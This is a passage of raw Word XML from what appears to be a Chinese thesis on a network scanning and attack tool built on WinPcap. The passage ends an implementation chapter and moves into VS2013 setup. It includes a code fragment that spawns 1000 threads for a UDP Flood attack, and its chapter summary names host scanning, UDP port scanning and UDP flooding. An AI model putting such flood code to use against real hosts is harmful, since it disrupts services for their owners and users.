    <w:p w14:paraId="6785A7DD" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D85A646" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B488EDD" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pcap_close(t);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099DA069" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3798702F" w14:textId="19660852" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1995"/>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1135" w:name="_Toc482141264"/>
      <w:bookmarkStart w:id="1136" w:name="_Toc482141937"/>
      <w:bookmarkStart w:id="1137" w:name="_Toc482522660"/>
      <w:r w:rsidRPr="00AA772D">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>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bookmarkEnd w:id="1135"/>
      <w:bookmarkEnd w:id="1136"/>
      <w:bookmarkEnd w:id="1137"/>
    </w:p>
    <w:p w14:paraId="7A59DE4C" w14:textId="39BE5F7C" w:rsidR="0070150E" w:rsidRPr="0070150E" w:rsidRDefault="0070150E" w:rsidP="0070150E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用</w:t>
      </w:r>
      <w:r>
        <w:t>CreateThread</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>创建多个线程进行</w:t>
      </w:r>
      <w:r>
        <w:t>UDP F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>lood</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E148088" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>for (size_t i = 0; i &lt; 1000; i++)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2393C9DC" w14:textId="77777777" w:rsidR="0080765D" w:rsidRDefault="0080765D" w:rsidP="0080765D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F6D45E" w14:textId="7375DD55" w:rsidR="00F167C1" w:rsidRPr="00075860" w:rsidRDefault="0080765D" w:rsidP="00075860">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">HANDLE hThread_udpScan = CreateThread(NULL, 0, </w:t>
      </w:r>
      <w:r w:rsidR="00075860">
        <w:t>udpScan, udpScanData, 0, NULL);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623DE90C" w14:textId="5B124DD8" w:rsidR="00F167C1" w:rsidRPr="00596B1B" w:rsidRDefault="00D51734" w:rsidP="00F167C1">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
          <w:rPrChange w:id="1138" w:author="李勇" w:date="2017-05-13T21:45:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
              <w:b/>
              <w:szCs w:val="30"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1139" w:name="_Toc482522661"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:rPrChange w:id="1140" w:author="李勇" w:date="2017-05-13T21:45:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>本章小结</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1139"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
          <w:rPrChange w:id="1141" w:author="李勇" w:date="2017-05-13T21:45:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
              <w:b/>
              <w:szCs w:val="30"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F9D274" w14:textId="303DE6B0" w:rsidR="00F167C1" w:rsidRDefault="00B936E1" w:rsidP="003D362D">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>本章主要为程序的实现，包括主机扫描，UDP端口扫描，UDP Flood攻击。主要介绍程序的具体实现过程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E12F7B8" w14:textId="780B908B" w:rsidR="00150B71" w:rsidRPr="0034487A" w:rsidRDefault="00F167C1" w:rsidP="003D362D">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:pageBreakBefore/>
        <w:spacing w:before="120" w:after="120" w:line="480" w:lineRule="auto"/>
        <w:ind w:left="431" w:hanging="431"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1142" w:name="_Toc482141939"/>
      <w:bookmarkStart w:id="1143" w:name="_Toc482522662"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>环境搭建及测试</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1099"/>
      <w:bookmarkEnd w:id="1142"/>
      <w:bookmarkEnd w:id="1143"/>
    </w:p>
    <w:p w14:paraId="24B19202" w14:textId="51093051" w:rsidR="00B12937" w:rsidRPr="0034487A" w:rsidRDefault="00B12937" w:rsidP="006E2249">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1144" w:name="_Hlt273261562"/>
      <w:bookmarkStart w:id="1145" w:name="_Toc482141267"/>
      <w:bookmarkStart w:id="1146" w:name="_Toc482141940"/>
      <w:bookmarkStart w:id="1147" w:name="_Toc482522663"/>
      <w:bookmarkEnd w:id="1144"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>开发环境</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1145"/>
      <w:bookmarkEnd w:id="1146"/>
      <w:bookmarkEnd w:id="1147"/>
    </w:p>
    <w:p w14:paraId="2E6B7014" w14:textId="0EF47A96"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平台</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>：win10</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>操作</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>系统</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB76F54"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工具</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>：visual stdio 2013</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>旗舰版</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A36CEF9" w14:textId="0A002BC5"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语言</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>及框架：C/C++</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AED7AF" w14:textId="6A6DEBF9"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环境</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>搭建步骤：Windows 10</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>系统</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>安装vs2013</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>下载winpcap程序包，安装以后</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>会生成一个WpdPack</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>目录</w:t>
      </w:r>
      <w:r w:rsidR="00922AF7" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E5CF30" w14:textId="35FC9888" w:rsidR="001A715D" w:rsidRPr="0034487A" w:rsidRDefault="001A715D" w:rsidP="001A715D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>然后使用</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>vs2013</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>建立</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>工程，完成后按一下步骤操作：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124A26C1" w14:textId="77777777" w:rsidR="001A715D" w:rsidRPr="0034487A" w:rsidRDefault="001A715D" w:rsidP="001A715D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>右键</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>项目名称</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>选择</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>属性</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>属性</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>配置”</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>“VC++目录”</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>如图</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.2所示</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C942D57" w14:textId="77777777" w:rsidR="008E2EC8" w:rsidRPr="0034487A" w:rsidRDefault="001A715D" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>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8120" cy="3107690"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BD6413" w14:textId="38EADC87" w:rsidR="001A715D" w:rsidRPr="00617E3B" w:rsidRDefault="008E2EC8" w:rsidP="008E2EC8">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>项目</w:t>
      </w:r>
      <w:r w:rsidRPr="00617E3B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>属性配置页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F328B51"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选择“包含</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>目录</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”，将</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>WpdPack目录下的</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>“Include”目录</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>添加到这里；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61178DCC" w14:textId="77777777" w:rsidR="001A715D" w:rsidRPr="0034487A" w:rsidRDefault="001A715D" w:rsidP="001A715D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>再</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>选择</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>“引用</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>目录</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”，</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>将WpdPack</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>目录</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>下的</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>“Lib”目录</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>添加到这里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21232F16" w14:textId="2695FE3D" w:rsidR="00B12937" w:rsidRPr="0034487A" w:rsidRDefault="001A715D" w:rsidP="00617E3B">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>然后</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>环境搭建就完成了，</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>只要</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>包含了头文件“pcap.h”</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>便可以使用winpcap中的函数了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567A06FF" w14:textId="12D55B4C" w:rsidR="002204F5" w:rsidRPr="0034487A" w:rsidRDefault="002204F5" w:rsidP="006E2249">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11617181" w14:textId="25068B0C" w:rsidR="002204F5" w:rsidRPr="0034487A" w:rsidRDefault="00CF1619" w:rsidP="002204F5">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1148" w:name="_Toc482141268"/>
      <w:bookmarkStart w:id="1149" w:name="_Toc482141941"/>
      <w:bookmarkStart w:id="1150" w:name="_Toc482522664"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>测试</w:t>
      </w:r>
      <w:r w:rsidR="002204F5" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>环境</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1148"/>
      <w:bookmarkEnd w:id="1149"/>
      <w:bookmarkEnd w:id="1150"/>
    </w:p>
